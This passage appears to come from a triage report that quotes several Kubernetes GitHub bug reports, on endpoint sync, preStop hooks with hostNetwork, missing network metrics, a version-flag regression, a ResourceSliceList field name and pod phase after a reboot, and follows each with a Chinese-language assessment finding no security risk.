I0807 14:01:51.645704       2 endpoints_controller.go:348] "Error syncing endpoints, retrying" service="test1/test-qa" err="endpoints informer cache is out of date, resource version 10168236546 already processed for endpoints test1/test-qa"
I0807 14:01:51.686942       2 endpoints_controller.go:348] "Error syncing endpoints, retrying" service="test1/test-qa" err="endpoints informer cache is out of date, resource version 10168236546 already processed for endpoints test1/test-qa"
I0807 14:01:51.768648       2 endpoints_controller.go:348] "Error syncing endpoints, retrying" service="test1/test-qa" err="endpoints informer cache is out of date, resource version 10168236546 already processed for endpoints test1/test-qa"
I0807 14:01:51.808043       2 endpoints_controller.go:348] "Error syncing endpoints, retrying" service="test1/test2-qa" err="endpoints informer cache is out of date, resource version 10168250766 already processed for endpoints test1/test2-qa"
I0807 14:01:51.930345       2 endpoints_controller.go:348] "Error syncing endpoints, retrying" service="test1/test-qa" err="endpoints informer cache is out of date, resource version 10168236546 already processed for endpoints test1/test-qa"
```
I also wrote a small script which would get me the out of sync endpoints compared to the endpointslices 
```
from kubernetes.client import CoreV1Api, DiscoveryV1Api
from hubspot_kube_utils.client import build_kube_client
import json
import os
from datetime import datetime

def extract_ips_from_endpoint(endpoint):
    ips = set()
    if endpoint.subsets:
        for subset in endpoint.subsets:
            if subset.addresses:
                ips.update(addr.ip for addr in subset.addresses)
            if subset.not_ready_addresses:
                ips.update(addr.ip for addr in subset.not_ready_addresses)
    return ips

def extract_ips_from_endpoint_slice(slice):
    if not slice.endpoints:
        return set()
    return set(address for endpoint in slice.endpoints
               for address in (endpoint.addresses or []))

def compare_endpoints_and_slices(core_client, discovery_client):
    all_mismatches = []

    try:
        namespaces = core_client.list_namespace()
    except Exception as e:
        print(f"Error listing namespaces: {e}")
        return all_mismatches

    for ns in namespaces.items:
        namespace = ns.metadata.name
        print(f"Processing namespace: {namespace}")

        try:
            endpoints = core_client.list_namespaced_endpoints(namespace)
        except Exception as e:
            print(f"Error listing endpoints in namespace {namespace}: {e}")
            continue

        for endpoint in endpoints.items:
            name = endpoint.metadata.name

            try:
                slices = discovery_client.list_namespaced_endpoint_slice(namespace, label_selector=f"kubernetes.io/service-name={name}")
            except Exception as e:
                print(f"Error listing endpoint slices for service {name} in namespace {namespace}: {e}")
                continue

            endpoint_ips = extract_ips_from_endpoint(endpoint)
            slice_ips = set()

            for slice in slices.items:
                slice_ips.update(extract_ips_from_endpoint_slice(slice))

            if endpoint_ips != slice_ips:
                mismatch = {
                    "namespace": namespace,
                    "service_name": name,
                    "endpoint_ips": list(endpoint_ips),
                    "slice_ips": list(slice_ips),
                    "missing_in_endpoint": list(slice_ips - endpoint_ips),
                    "missing_in_slice": list(endpoint_ips - slice_ips)
                }
                all_mismatches.append(mismatch)

        print(f"Completed processing namespace: {namespace}")
        print("---")

    return all_mismatches

def save_to_json(data, cluster_name):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{cluster_name}_mismatches_{timestamp}.json"

    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

    print(f"Mismatch data for cluster {cluster_name} saved to {filename}")

def main():
    clusters = ["test"]
    all_cluster_mismatches = {}

    for cluster_name in clusters:
        print(f"Processing cluster: {cluster_name}")

        try:
            kube_client = build_kube_client(host="TEST",
                              token="TOKEN")

            core_client = CoreV1Api(kube_client)
            discovery_client = DiscoveryV1Api(kube_client)

            mismatches = compare_endpoints_and_slices(core_client, discovery_client)

            all_cluster_mismatches[cluster_name] = mismatches

            save_to_json(mismatches, cluster_name)

            print(f"Completed processing cluster: {cluster_name}")
            print(f"Total mismatches found in this cluster: {len(mismatches)}")
        except Exception as e:
            print(f"Error processing cluster {cluster_name}: {e}")


if __name__ == "__main__":
    main()
```

#### What did you expect to happen?

I expect the endpoints to eventually sync and reflect the most upto date information. 

#### How can we reproduce it (as minimally and precisely as possible)?

I have just deployed the newer patch to our cluster and that has resulted in endpoints never ending up being updated if the status goes out of sync. 

#### Anything else we need to know?

_No response_

#### Kubernetes version

Client Version: v1.29.7
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.7


#### Cloud provider

<details>

</details>


#### OS version

almalinux-9

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

cri-o

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue主要描述了Kubernetes集群中endpoints与endpointslices不同步的问题，导致endpoints无法正确更新。提供的日志信息和Python脚本用于诊断这个同步问题。

根据提供的内容，没有涉及任何可被攻击者利用的安全风险。脚本中使用的主机地址和令牌（host="TEST"，token="TOKEN"）都是占位符，并未泄露真实的敏感信息。

按照风险判断标准，此Issue不涉及安全问题。

---

## Issue #126572 PreStop don't work if hostNetwork set to true

- Issue 链接：[#126572](https://github.com/kubernetes/kubernetes/issues/126572)

### Issue 内容

#### What happened?

`lifecycle.preStop.httpGet` don't work if `hostNetwork` set to `true`

#### What did you expect to happen?

`lifecycle.preStop.httpGet` worked if `hostNetwork` set to `true`

#### How can we reproduce it (as minimally and precisely as possible)?

I have simple code on Golang for test this issue - https://github.com/zvlb/k8s-prestop-check (simple HTTP server with 1 url `/sleep` - for sleeping 15 second and SIGTERM handler)
And image - `zvlb/k8s-prestop-check:v0.0.1`

#### First example

If deploy this image with simple deployment
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: k8s-prestop-check
  labels:
    app: k8s-prestop-check
spec:
  replicas: 1
  selector:
    matchLabels:
      app: k8s-prestop-check
  template:
    metadata:
      labels:
        app: k8s-prestop-check
    spec:
      containers:
      - name: k8s-prestop-check
        image: zvlb/k8s-prestop-check:v0.0.1
        lifecycle:
          preStop:
            httpGet:
              path: /sleep
              port: 8080
              scheme: HTTP
```

And delete pod after creating. I see in logs how `lifecycle.preStop` get `/sleep` request and pod deleted after it:

```
❯ k logs k8s-prestop-check-5fcf5f7cc7-lx7ht -f
1723027959. awaiting signal   
1723029549. Sleep request run                # DELETE POD HERE 
1723029564. Sleep request done

1723029564. terminated
1723029564. exiting
```

All work good

#### Second example

If deploy this image with deployment with hostNetwork
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: k8s-prestop-check-hostnetwork
  labels:
    app: k8s-prestop-check-hostnetwork
spec:
  replicas: 1
  selector:
    matchLabels:
      app: k8s-prestop-check-hostnetwork
  template:
    metadata:
      labels:
        app: k8s-prestop-check-hostnetwork
    spec:
      containers:
      - name: k8s-prestop-check
        image: zvlb/k8s-prestop-check:v0.0.1
        lifecycle:
          preStop:
            httpGet:
              path: /sleep
              port: 8080
              scheme: HTTP
      hostNetwork: true
```

And delete pod after creating. I see in logs how `lifecycle.preStop` get `/sleep` request and pod deleted after it:

```
❯ k logs k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2 -f
1723028763. awaiting signal

1723029866. terminated                # DELETE POD HERE 
1723029866. exiting
```

In kubelet logs:
```json
{
    "ts": 1723030170266.806,
    "caller": "kuberuntime/kuberuntime_container.go:645",
    "msg": "Running preStop hook",
    "v": 3,
    "pod": {
        "name": "k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2",
    },
    "podUID": "fb0d78fd-645c-4c88-86d8-a528ce55e4ed",
    "containerName": "k8s-prestop-check",
    "containerID": "containerd://5f1a0ae6fae3957d8ed6d7a2083a00a3819a905e77f49647b7707cbeb1934e80"
}
{
    "ts": 1723030170266.92,
    "caller": "record/event.go:376",
    "msg": "Event occurred",
    "v": 3,
    "object": {
        "name": "k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2",
    },
    "fieldPath": "spec.containers{k8s-prestop-check}",
    "kind": "Pod",
    "apiVersion": "v1",
    "type": "Normal",
    "reason": "Killing",
    "message": "Stopping container k8s-prestop-check"
}
{
    "ts": 1723030170268.5867,
    "caller": "lifecycle/handlers.go:87",
    "msg": "HTTP lifecycle hook for Container in Pod failed",
    "path": "/sleep",
    "containerName": "k8s-prestop-check",
    "pod": {
        "name": "k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2",
    },
    "err": "failed to find networking container: &{fb0d78fd-645c-4c88-86d8-a528ce55e4ed k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2 [] [0xc004b0c200] [&PodSandboxStatus{Id:7299112c0f8e5033f356bf04836221d039b0aab69907c2e3b9bf4fea4caf30ff,Metadata:&PodSandboxMetadata{Name:k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2,Uid:fb0d78fd-645c-4c88-86d8-a528ce55e4ed,Namespace:default,Attempt:0,},State:SANDBOX_READY,CreatedAt:1723029867435367792,Network:&PodSandboxNetworkStatus{Ip:,AdditionalIps:[]*PodIP{},},Linux:&LinuxPodSandboxStatus{Namespaces:&Namespace{Options:&NamespaceOption{Network:NODE,Pid:CONTAINER,Ipc:POD,TargetId:,UsernsOptions:nil,},},},Labels:map[string]string{app: k8s-prestop-check-hostnetwork,io.kubernetes.pod.name: k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2,io.kubernetes.pod.namespace: default,io.kubernetes.pod.uid: fb0d78fd-645c-4c88-86d8-a528ce55e4ed,pod-template-hash: 5b94b797bc,},Annotations:map[string]string{kubernetes.io/config.seen: 2024-08-07T14:24:27.123470171+03:00,kubernetes.io/config.source: api,kubernetes.io/limit-ranger: LimitRanger plugin set: cpu, memory request for container k8s-prestop-check; cpu, memory limit for container k8s-prestop-check,},RuntimeHandler:,}] 0001-01-01 00:00:00 +0000 UTC}"
}
{
    "ts": 1723030170268.621,
    "caller": "kuberuntime/kuberuntime_container.go:653",
    "msg": "PreStop hook failed",
    "pod": {
        "name": "k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2",
    },
    "podUID": "fb0d78fd-645c-4c88-86d8-a528ce55e4ed",
    "containerName": "k8s-prestop-check",
    "containerID": "containerd://5f1a0ae6fae3957d8ed6d7a2083a00a3819a905e77f49647b7707cbeb1934e80",
    "err": "failed to find networking container: &{fb0d78fd-645c-4c88-86d8-a528ce55e4ed k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2 default [] [0xc004b0c200] [&PodSandboxStatus{Id:7299112c0f8e5033f356bf04836221d039b0aab69907c2e3b9bf4fea4caf30ff,Metadata:&PodSandboxMetadata{Name:k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2,Uid:fb0d78fd-645c-4c88-86d8-a528ce55e4ed,Namespace:default,Attempt:0,},State:SANDBOX_READY,CreatedAt:1723029867435367792,Network:&PodSandboxNetworkStatus{Ip:,AdditionalIps:[]*PodIP{},},Linux:&LinuxPodSandboxStatus{Namespaces:&Namespace{Options:&NamespaceOption{Network:NODE,Pid:CONTAINER,Ipc:POD,TargetId:,UsernsOptions:nil,},},},Labels:map[string]string{app: k8s-prestop-check-hostnetwork,io.kubernetes.pod.name: k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2,io.kubernetes.pod.namespace: default,io.kubernetes.pod.uid: fb0d78fd-645c-4c88-86d8-a528ce55e4ed,pod-template-hash: 5b94b797bc,},Annotations:map[string]string{kubernetes.io/config.seen: 2024-08-07T14:24:27.123470171+03:00,kubernetes.io/config.source: api,kubernetes.io/limit-ranger: LimitRanger plugin set: cpu, memory request for container k8s-prestop-check; cpu, memory limit for container k8s-prestop-check,},RuntimeHandler:,}] 0001-01-01 00:00:00 +0000 UTC}"
}
{
    "ts": 1723030170268.6584,
    "caller": "kuberuntime/kuberuntime_container.go:665",
    "msg": "PreStop hook completed",
    "v": 3,
    "pod": {
        "name": "k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2",
    },
    "podUID": "fb0d78fd-645c-4c88-86d8-a528ce55e4ed",
    "containerName": "k8s-prestop-check",
    "containerID": "containerd://5f1a0ae6fae3957d8ed6d7a2083a00a3819a905e77f49647b7707cbeb1934e80"
}
{
    "ts": 1723030170268.67,
    "caller": "record/event.go:376",
    "msg": "Event occurred",
    "v": 3,
    "object": {
        "name": "k8s-prestop-check-hostnetwork-5b94b797bc-rs6z2",
    },
    "fieldPath": "spec.containers{k8s-prestop-check}",
    "kind": "Pod",
    "apiVersion": "v1",
    "type": "Warning",
    "reason": "FailedPreStopHook",
    "message": "PreStopHook failed"
}
```


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.5
```

</details>


#### Cloud provider

<details>
baremetal
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Kubernetes中，当Pod设置了`hostNetwork: true`时，生命周期钩子`preStop`的`httpGet`方式无法正常工作，并提供了详细的复现步骤和日志。这是一个功能性缺陷或者Bug，导致预期的`preStop`钩子未被执行。但根据风险判断标准，该问题并不涉及安全风险。

根据标准：

- **第6条**：如果Issue不涉及安全问题，则风险评级判断为不涉及。

该问题并未导致权限提升、敏感信息泄露、远程代码执行等安全风险。它不会被攻击者利用来破坏系统的安全性，故评估为不涉及安全风险。

---

## Issue #126682 Container network metrics missing with kubelet 1.30 and crio-1.30

- Issue 链接：[#126682](https://github.com/kubernetes/kubernetes/issues/126682)

### Issue 内容

#### What happened?

Upgraded kubernetes cluster from 1.29 to 1.30, and container network metrics disappeared.

#### What did you expect to happen?

Expected metrics to be available as before.

#### How can we reproduce it (as minimally and precisely as possible)?

Run crio-1.30 with default config, deploy kubernetes 1.30, deploy a pod, and collect cadvisor metrics. `container_network_receive_bytes_total` and other metrics are not reported for pod.

#### Anything else we need to know?

Seems that crio dropping infra containers and a change in cadvisor results in this misbehavior. https://github.com/google/cadvisor/issues/3577

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.28.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.2
WARNING: version difference between client (1.28) and server (1.30) exceeds the supported minor version skew of +/-1
```

</details>


#### Cloud provider

<details>
Bare metal
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
$ uname -a
Linux k8s-node01 5.15.162 #2 SMP Tue Jul 9 08:02:50 UTC 2024 aarch64 GNU/Linux
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
cri-o 1.30
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
kube-router v2.1.3
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据Issue描述，升级Kubernetes集群到1.30版本后，容器的网络指标消失了。这是由于crio和cadvisor的变化导致的指标收集问题。

该问题属于功能性缺陷，影响了运维人员对容器网络性能的监控和统计。但它并不涉及任何安全风险，攻击者无法利用该问题进行攻击，也不会导致权限提升、数据泄露或服务拒绝等安全问题。

---

## Issue #126681 [kubelet] Pod is deleted due to Node not ready, deletions is cancelled, kubelet is not aware container is not running

- Issue 链接：[#126681](https://github.com/kubernetes/kubernetes/issues/126681)

### Issue 内容

#### What happened?

We had following sequence of events:
* node was not ready
* pod was deleted becasue of it
* then deletion of the pod was cancelled

at the end:
* main container was terminated, and kubelet thinks it is running, but it is not. It tries to execute liveness and readiness check, but they are failing 
* pod stuck in terminating phase

#### What did you expect to happen?

* kubelet recognized that container is not running, it proceed with termination of pod

#### How can we reproduce it (as minimally and precisely as possible)?

My idea is to have:
* pod which terminates for a while
* put node in not ready state to trigger taint based eviction
* "fix" the node to cancel deletion

#### Anything else we need to know?

[slack discussion](https://kubernetes.slack.com/archives/C0BP8PW9G/p1722933365605479)

Logs:
```
2024-08-05 10:19:52	Cancelling deletion of Pod xxx
2024-08-05 10:47:03	Node is not ready
2024-08-05 10:47:34	Cancelling deletion of Pod xxx
2024-08-05 11:04:08	Node is not ready
2024-08-05 11:07:19	Cancelling deletion of Pod xxx
2024-08-05 11:08:59	Readiness probe failed: Get "http://10.184.23.109:15021/healthz/ready": dial tcp 10.184.23.109:15021: connect: connection refused
2024-08-05 11:09:54	Readiness probe errored: rpc error: code = Unknown desc = failed to exec in container: failed to start exec "8b251f765bc1008ac8d59927f78e3b962fb1c147135be96c3dc411cc5fdf2758": OCI runtime exec failed: exec failed: cannot exec in a stopped container: unknown
2024-08-05 11:09:54	Liveness probe errored: rpc error: code = Unknown desc = failed to exec in container: failed to start exec "50bd9e7d0c45c55025dd2a722b6f7bbe7bb7cad9dca49c394cc27c7efc990d72": OCI runtime exec failed: exec failed: cannot exec in a stopped container: unknown
2024-08-05 11:09:54	Readiness probe errored: rpc error: code = Unknown desc = failed to exec in container: failed to start exec "33016f203cc77f545ce131fb3be9bbc93e4031e14eb79ba303911f7269abd332": OCI runtime exec failed: exec failed: cannot exec in a stopped container: unknown
2024-08-05 11:09:54	Liveness probe errored: rpc error: code = Unknown desc = failed to exec in container: failed to start exec "73920379d5305b92e563104cab3ad96840f3f33fe80bfad420bc6c261507caa2": OCI runtime exec failed: exec failed: cannot exec in a stopped container: unknown
2024-08-05 11:10:03	Readiness probe errored: rpc error: code = Unknown desc = failed to exec in container: failed to start exec "33cc325ee13a9f3aee27f2d3ef5b0d5ead6989cb1410b65093272e7d616730ad": OCI runtime exec failed: exec failed: cannot exec in a stopped container: unknown
2024-08-05 11:10:13	Readiness probe errored: rpc error: code = Unknown desc = failed to exec in container: failed to start exec "caec0276c24dd30d29a0702f4c1f4ba9fedabc2aac6da7e51c1bd5c316e52711": OCI runtime exec failed: exec failed: cannot exec in a stopped container: unknown
2024-08-05 11:10:13	Liveness probe errored: rpc error: code = Unknown desc = failed to exec in container: failed to start exec "812a6251f5a1c620fea52c7295c73c3c9870a89c12fa2971798f8b6927b92613": OCI runtime exec failed: exec failed: cannot exec in a stopped container: unknown
2024-08-05 11:10:23	Readiness probe errored: rpc error: code = Unknown desc = failed to exec in container: failed to start exec "f548dc750d2782295a1a383ba8341f63897cbc98b068e529de1f950fe740a361": OCI runtime exec failed: exec failed: cannot exec in a stopped container: unknown
2024-08-05 11:10:34	(combined from similar events): Readiness probe errored: rpc error: code = Unknown desc = failed to exec in container: failed to start exec "3bcc62a49570d57b79b26b204cc19b32371439cd55907dcbc1b208d8f5765031": OCI runtime exec failed: exec failed: cannot exec in a stopped container: unknown
2024-08-05 19:32:42	error killing pod: [failed to "KillContainer" for "yyy" with KillContainerError: "rpc error: code = DeadlineExceeded desc = context deadline exceeded", failed to "KillPodSandbox" for "b23ad3e5-1d53-4999-9ca4-af928620bd10" with KillPodSandboxError: "rpc error: code = DeadlineExceeded desc = context deadline exceeded"]
2024-08-05 19:32:43	Stopping container yyy
2024-08-05 20:03:14	Readiness probe errored: rpc error: code = Unknown desc = failed to exec in container: failed to start exec "0f9320bc18d366466eaa289fd9d03bd6dddd124e42c17e4f4fcd889ee234309d": OCI runtime exec failed: exec failed: cannot exec in a stopped container: unknown
```



#### Kubernetes version

<details>

```console
1.27.9
```

</details>


#### Cloud provider

<details>
Azure/AKS
</details>


#### OS version

<details>

```console
Ubuntu 22.04.4 LTS
AKSUbuntu-2204gen2containerd-202407.03.0

```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd://1.7.15-1

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在特定情况下，kubelet未能正确识别容器已停止运行，导致Pod卡在terminating状态。具体情境是节点处于Not Ready状态，Pod被删除，但删除操作又被取消，结果导致kubelet认为容器仍在运行，而实际上容器已终止。

经过分析，这属于kubelet的逻辑错误或状态同步问题，并未涉及任何安全漏洞。根据提供的信息，没有显示攻击者能够利用该问题来获得未经授权的访问、执行命令、提升权限或进行拒绝服务攻击。

根据风险判断标准：

1. **该风险能被攻击者利用**：没有证据表明攻击者可以利用此问题。
2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：此问题不符合。
6. **如果Issue不涉及安全问题，则风险评级判断为不涉及**。

因此，综合以上分析，此Issue不涉及安全风险。

---

## Issue #126663 kube-apiserver and other components no longer honor --version build ID overrides

- Issue 链接：[#126663](https://github.com/kubernetes/kubernetes/issues/126663)

### Issue 内容

#### What happened?

Starting in 1.31, --version no longer works to modify the build ID of the running components.

/kind regression
/priority important-soon


#### What did you expect to happen?

Running kube-apiserver v1.31.0 with `--version=v1.31.0-example.123` ignores the modified build ID and reports `v1.31.0`

In 1.28, 1.29, and 1.30 (since https://github.com/kubernetes/kubernetes/pull/117688), this allowed modifying the build ID of the running server.

/sig api-machinery
/assign @jpbetz @siyuanfoundation

#### How can we reproduce it (as minimally and precisely as possible)?

Run `kube-apiserver` v1.31.0 with `--version=v1.31.0-example.123`

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.31.0

#### Cloud provider

n/a

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue反映了kube-apiserver在1.31版本中，`--version`参数不再起作用，无法修改运行组件的构建ID，这是一个功能上的回归问题。这意味着管理员无法通过`--version`参数来设置自定义的版本号。然而，这并不涉及任何安全风险。

首先，该问题并不涉及任何可以被攻击者利用的漏洞。攻击者无法通过这个问题来获取未授权的访问、提升权限、远程代码执行或其他安全威胁。

其次，该问题不会导致敏感信息泄露、权限提升或其他安全相关的影响。

因此，根据风险判断标准，该Issue不涉及安全问题，风险评级判断为“不涉及”。

---

## Issue #126659 ResourceSliceList object has `listMeta` field instead of `metadata` field

- Issue 链接：[#126659](https://github.com/kubernetes/kubernetes/issues/126659)

### Issue 内容

#### What happened?

Listing `v1alpha3.ResourceSlice`s on v1.31.0 returns an object with a `listMeta` field instead of the standard `metadata` field for (list) objects:

```sh
$ curl -kL --cert client.pem --key client.key.pem 'https://127.0.0.1:39987/apis/resource.k8s.io/v1alpha3/resourceslices'

{
  "kind": "ResourceSliceList",
  "apiVersion": "resource.k8s.io/v1alpha3",
  "listMeta": {
    "resourceVersion": "522"
  },
  "items": []
}
```

Listing `v1alpha2.ResourceSlice`s on v1.30.3 behaves correctly:

```sh
$ curl -kL --cert client.pem --key client.key.pem 'https://127.0.0.1:34519/apis/resource.k8s.io/v1alpha2/resourceslices'

{
  "kind": "ResourceSliceList",
  "apiVersion": "resource.k8s.io/v1alpha2",
  "metadata": {
    "resourceVersion": "422"
  },
  "items": []
}
```

This is also propagated to the Swagger spec (which is how I noticed it, since I maintain the Rust bindings for the client API). v1.31.0:

```json
    "io.k8s.api.resource.v1alpha3.ResourceSliceList": {
        "listMeta": {
          "$ref": "#/definitions/io.k8s.apimachinery.pkg.apis.meta.v1.ListMeta",
          "description": "Standard list metadata"
        }
```

v1.30.3:

```json
    "io.k8s.api.resource.v1alpha2.ResourceSliceList": {
        "metadata": {
          "$ref": "#/definitions/io.k8s.apimachinery.pkg.apis.meta.v1.ListMeta",
          "description": "Standard list metadata"
        }
```

#### What did you expect to happen?

As explained above.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Deploy v1.31.0 with `DynamicResourceAllocation` feature gate enabled and runtime config `resource.k8s.io/v1alpha3=true`. With kind, this is:

    ```yaml
    kind: Cluster
    apiVersion: kind.x-k8s.io/v1alpha4
    featureGates:
      DynamicResourceAllocation: true
    runtimeConfig:
      'resource.k8s.io/v1alpha3': 'true'
    ```

2. Perform the API server request as in the above curl command in any way you like as long as it lets you see the raw JSON response.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version

Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
kind 0.23.0
</details>


#### OS version

<details>

```console
N/A
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
此Issue报告了在Kubernetes v1.31.0中，`ResourceSliceList`对象的API响应中使用了`listMeta`字段，而不是标准的`metadata`字段。这可能导致基于API的客户端或工具在解析响应时出现问题。然而，这仅仅是API响应中的字段命名不一致问题，并不会导致任何安全漏洞。攻击者无法利用该问题进行攻击，也不会导致权限提升、数据泄露或执行任意代码等安全风险。因此，该Issue不涉及安全风险。

---

## Issue #126650 Pod status phase misses Pending transition after node reboot

- Issue 链接：[#126650](https://github.com/kubernetes/kubernetes/issues/126650)

### Issue 内容

#### What happened?

When a kubernetes node is rebooted, all the containers running on the node are terminated and then created & started over again. When the pod has a list of init containers runing, and if the init container takes a little bit time (longer than PLEG period), the pod is supposed to have `status.phase: Pending`, but instead, during the whole operation, `status.phase` is always `Running`.

This new behavior (always has `status.phase: Running`) started when "restartable init container" was [introduced][1]. After node reboots, all the regular init containers are started one by one, so `pendingInitialization` is supposed by larger than 0 (unless the init container is completed pretty fast that PLEG doesn't catch any running init container), and should report `Pending` phase. But the behavior has changed to check further whether there are any other regular containers that have started. In the case of node reboot, all the other regular containers are already terminated, and then considered as "yes, they have started", and then no longer reported as `Pending`.

I think this behavior change is unexpected, as that violates the [definition][2] of "Running":

> // PodRunning means the pod has been bound to a node and all of the containers have been started.
	// At least one container is still running or is in the process of being restarted.

None of the containers are started or running, and they are not in the process of being started or restarted since init containers are still running.

[1]: https://github.com/kubernetes/kubernetes/blob/099a88370d017dacf16e67306ebcdec8394fae83/pkg/kubelet/kubelet_pods.go#L1675-L1685
[2]: https://github.com/kubernetes/kubernetes/blob/099a88370d017dacf16e67306ebcdec8394fae83/pkg/apis/core/types.go#L2871


#### What did you expect to happen?

I expect that pods with init containers should transition into "Pending" when kubelet observed that its regular init container is still running and none of its main containers are started.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Launch a cluster with minikube:

```console
$ minikube start --nodes=2 --kubernetes-version=v1.30.3
```

2. Create the following pod:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: sleep
spec:
  restartPolicy: Always
  containers:
  - name: sleep
    image: busybox
    command:
    - sleep
    - infinity
  initContainers:
  - name: snap
    image: busybox
    command:
    - sleep
    - "10"
```

3. Log in the node and simulate "reboot"

```console
$ minikube ssh --node <node-which-runs-the-pod-above>
...
# systemctl stop kubelet
# docker stop $(docker ps -aq)
# systemctl start kubelet
```

4. Observe the pod status via:

```console
$ k get pods -w -o jsonpath='{$.status.phase}{"\n"}'
```

On 1.30.3, the output from 4 is `Running` constantly, while in previous kubernetes version (for e,g, v1.23.17), it will show "Pending" while the init container is still Running.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
WARNING: This version information is deprecated and will be replaced with the output from kubectl version --short.  Use --output=yaml|json to get the full version.
Client Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.0", GitCommit:"b46a3f887ca979b1a5d14fd39cb1af43e7e5d12d", GitTreeState:"clean", BuildDate:"2022-12-08T19:58:30Z", GoVersion:"go1.19.4", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"30", GitVersion:"v1.30.3", GitCommit:"6fc0a69044f1ac4c13841ec4391224a2df241460", GitTreeState:"clean", BuildDate:"2024-07-16T23:48:12Z", GoVersion:"go1.22.5", Compiler:"gc", Platform:"linux/amd64"}
WARNING: version difference between client (1.26) and server (1.30) exceeds the supported minor version skew of +/-1
```

</details>


#### Cloud provider

<details>
None (minikube)
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，该问题描述了在Kubernetes节点重启后，具有初始化容器（init containers）的Pod的状态未正确过渡到`Pending`，而是持续显示为`Running`。这是因为在节点重启后，所有容器都会被终止并重新启动，当初始化容器运行时，预期Pod的状态应为`Pending`，但实际表现为`Running`。

从安全风险的角度来看，这一问题主要涉及到Pod状态显示的不一致或不准确。但是，这并不涉及攻击者可以利用的漏洞。攻击者无法通过此问题获得未授权的访问或提升权限，也无法通过此问题进行拒绝服务攻击或其他安全威胁。

根据风险判断标准，此问题不符合高风险的条件，不会被分配CVE编号，且不存在可被攻击者利用的安全漏洞。因此，该Issue不涉及安全风险。

---

## Issue #126637 `kubectl wait --for=jsonpath='{.status.readyReplicas}'=1` fails in 1.31.0-rc.1

- Issue 链接：[#126637](https://github.com/kubernetes/kubernetes/issues/126637)

### Issue 内容

#### What happened?

https://kubernetes.slack.com/archives/C0EG7JC6T/p1723471158762629

In v1.31.0-rc.1 `kubectl wait --for=jsonpath='{.status.readyReplicas}'=1` commands hang, see relevant thread for details.



#### What did you expect to happen?

